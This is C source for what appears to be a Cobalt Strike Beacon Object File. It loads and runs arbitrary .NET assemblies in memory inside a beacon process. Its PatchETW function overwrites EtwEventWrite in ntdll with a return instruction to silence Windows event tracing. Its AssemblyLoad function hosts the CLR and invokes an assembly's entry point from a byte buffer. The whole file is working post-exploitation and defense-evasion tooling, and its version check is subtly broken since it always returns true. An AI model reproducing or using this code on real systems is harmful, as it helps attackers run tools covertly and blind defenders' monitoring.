#include "InlineExecute_Assembly.h"
#include "beacon.h"

#define STATUS_SUCCESS 0

BOOL PatchETW()
{
	LPVOID pEtwEventWrite = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

	if (pEtwEventWrite == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] pEtwEventWrite Failed");
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] pEtwEventWrite Success");

	DWORD oldProtect;

#ifdef _M_AMD64
	SIZE_T length = 1;
	char patch[] = { 0xc3 };
#elif defined(_M_IX86)
	SIZE_T length = 3;
	char patch[] = { 0xc2,0x14,0x00 };
#endif

	NTSTATUS ntStatus = STATUS_SUCCESS;
	HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, TRUE, KERNEL32$GetCurrentProcessId());
	BeaconPrintf(CALLBACK_OUTPUT, "[+] OpenProcess Success");

	if (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, PAGE_EXECUTE_READWRITE, &oldProtect) == FALSE)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtectEx Failed");
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] VirtualProtectEx Success");

	SIZE_T NumberOfBytesWritten = 0;
	if (KERNEL32$WriteProcessMemory(hProcess, pEtwEventWrite, patch, length, &NumberOfBytesWritten) == FALSE)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] WriteProcessMemory Failed");
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] WriteProcessMemory Success");

	if (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, oldProtect, &oldProtect) == FALSE)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtectEx Failed");
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] VirtualProtectEx Success");
	return TRUE;

}


BOOL FindVersion(char* AssemblyBytes, int dwLength)
{
	BOOL flag = TRUE;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
	for (int i = 0; i < dwLength; i++)
	{
		if (MSVCRT$memcmp(AssemblyBytes, v4, 10) == 0)
		{
			flag = TRUE;
			break;
		}
	}
	return flag;
	//int count = 0;
	//for (int i = 0; i < dwLength; i++)
	//{
	//	for (int j = 0; j < 10; j++)
	//	{
	//		if (AssemblyBytes[i] == v4[j])
	//		{
	//			count++;
	//		}
	//	}
	//	if (count == 10)
	//	{
	//		flag = TRUE;
	//		break;
	//	}
	//	count = 0;
	//	
	//}
	//return flag;
}

BOOL AssemblyLoad(wchar_t* wNetVersion , char* AssemblyBytes , DWORD AssemblyLength, LPWSTR* ArgumentsArray, int NumArguments)
{
	HRESULT hr;
	ICLRMetaHost* iMetaHost = NULL;
	ICLRRuntimeInfo* iRuntimeInfo = NULL;
	ICorRuntimeHost* iRuntimeHost = NULL;
	IUnknown* pAppDomain = NULL;
	AppDomain* pDefaultAppDomain = NULL;
	Assembly* pAssembly = NULL;
	MethodInfo* pMethodInfo = NULL;

	SAFEARRAYBOUND saBound[1];
	void* pData = NULL;
	VARIANT vRet;
	VARIANT vObj;
	VARIANT vPsa;
	SAFEARRAY* args = NULL;

	hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (VOID**)&iMetaHost);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] CLRCreateInstance Failed:%d",hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] CLRCreateInstance Success");


	hr = iMetaHost->lpVtbl->GetRuntime(iMetaHost, wNetVersion, &xIID_ICLRRuntimeInfo, (VOID**)&iRuntimeInfo);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] GetRuntime Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] GetRuntime Success");

	hr = iRuntimeInfo->lpVtbl->GetInterface(iRuntimeInfo,&xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (VOID**)&iRuntimeHost);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]GetInterface Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] GetInterface Success");

	hr = iRuntimeHost->lpVtbl->Start(iRuntimeHost);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]CLR Start Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] CLR Start Success");


	//hr = iRuntimeHost->lpVtbl->GetDefaultDomain(iRuntimeHost,&pAppDomain);
	hr = iRuntimeHost->lpVtbl->CreateDomain(iRuntimeHost, (LPCWSTR)L" ", NULL, &pAppDomain);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]GetDefaultDomain Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] GetDefaultDomain Success");


	hr = pAppDomain->lpVtbl->QueryInterface(pAppDomain, &xIID_AppDomain, (VOID**)&pDefaultAppDomain);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]QueryInterface Failed:%p", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] QueryInterface Success");

	saBound[0].cElements = AssemblyLength;
	saBound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, saBound);
	if (pSafeArray == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]SafeArrayCreate Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+]SafeArrayCreate Success");

	hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pData);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]SafeArrayAccessData Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] SafeArrayAccessData Success");

	MSVCRT$memcpy(pData, AssemblyBytes, AssemblyLength);

	hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]SafeArrayUnaccessData Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] SafeArrayUnaccessData Success");

	hr = pDefaultAppDomain->lpVtbl->Load_3(pDefaultAppDomain,pSafeArray, &pAssembly);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]Load_3 Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Load_3 Success");

	hr = pAssembly->lpVtbl->EntryPoint(pAssembly,&pMethodInfo);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]EntryPoint Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] EntryPoint Success");

	MSVCRT$memset(&vRet, 0, sizeof(VARIANT));
	MSVCRT$memset(&vObj, 0, sizeof(VARIANT));
	vObj.vt = VT_NULL;
	vPsa.vt = (VT_ARRAY | VT_BSTR);
	args = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 1);
	if (NumArguments > 1)
	{
		vPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, NumArguments);
		for (long i = 0; i < NumArguments; i++)
		{
			OLEAUT32$SafeArrayPutElement(vPsa.parray, &i, OLEAUT32$SysAllocString(ArgumentsArray[i]));
		}
		long idx[1] = { 0 };
		OLEAUT32$SafeArrayPutElement(args, idx, &vPsa);
	}

	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo,vObj, args, &vRet);
	if (hr != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!]Invoke Failed:%d", hr);
		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Invoke Success");

	pMethodInfo->lpVtbl->Release(pMethodInfo);
	pAssembly->lpVtbl->Release(pAssembly);
	pDefaultAppDomain->lpVtbl->Release(pDefaultAppDomain);
	iRuntimeInfo->lpVtbl->Release(iRuntimeInfo);
	iMetaHost->lpVtbl->Release(iMetaHost);
	OLE32$CoUninitialize();
	return TRUE;

}

void go(char* args, int length)
{
	BeaconPrintf(CALLBACK_OUTPUT, "[+] go go go");

	if(PatchETW() == TRUE)
	{
		BeaconPrintf(CALLBACK_OUTPUT,"patch etw Success");
	}

	datap  parser;
	BeaconDataParse(&parser, args, length);
	char* AssemblyBytes = BeaconDataExtract(&parser, NULL);
	DWORD AssemblyLength = BeaconDataInt(&parser);
	char* AssemblyArguments = BeaconDataExtract(&parser, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] AssemblyArguments: %s and AssemblyLength :%d ", AssemblyArguments, AssemblyLength);

	wchar_t* wNetVersion = NULL;
	if (FindVersion(AssemblyBytes, AssemblyLength) == TRUE)
	{
		wNetVersion = L"v4.0.30319";
		//toWideChar("v4.0.30319", wNetVersion, 22);
	}
	else
	{
		wNetVersion = L"v2.0.50727";
		//toWideChar("v2.0.50727", wNetVersion, 22);
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] wNetVersion is %ls", wNetVersion);

	////将Assembly参数转化为WCHAR类型
	size_t convertedChars = 0;
	wchar_t* wAssemblyArguments = NULL;
	DWORD wideSize = MSVCRT$strlen(AssemblyArguments) + 1;
	wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
	MSVCRT$mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, AssemblyArguments, _TRUNCATE);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] wAssemblyArguments is %ls", wAssemblyArguments);

	int NumArgs = 0;
	LPWSTR* ArgumentsArray = NULL;
	ArgumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &NumArgs);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] ArgumentsArray is %ls", wAssemblyArguments);

	AssemblyLoad(wNetVersion, AssemblyBytes, AssemblyLength, ArgumentsArray, NumArgs);

}